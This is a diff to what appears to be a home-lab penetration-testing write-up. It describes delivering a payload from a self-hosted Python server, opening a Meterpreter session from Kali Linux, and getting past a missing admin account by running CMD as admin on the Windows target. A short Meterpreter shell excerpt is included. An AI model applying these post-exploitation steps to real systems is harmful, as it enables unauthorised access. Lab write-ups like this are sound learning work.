@@ -8,6 +8,10 @@ After establishing an interactive session, a native Windows shell channel was sp
 
 used a selfhosted server using python to donwnload the script and used meterpreter connection to run the payload on my kali linux machine
 
+Attack failed - the attack needed a admin account - that needs the active directory VM running - could only run 3 VMs within my machines capability - 
+bypass- ran CMD as admin on the windows machine and ran the payload
+
+
 ```msf
 meterpreter > shell
 Process 9772 created.
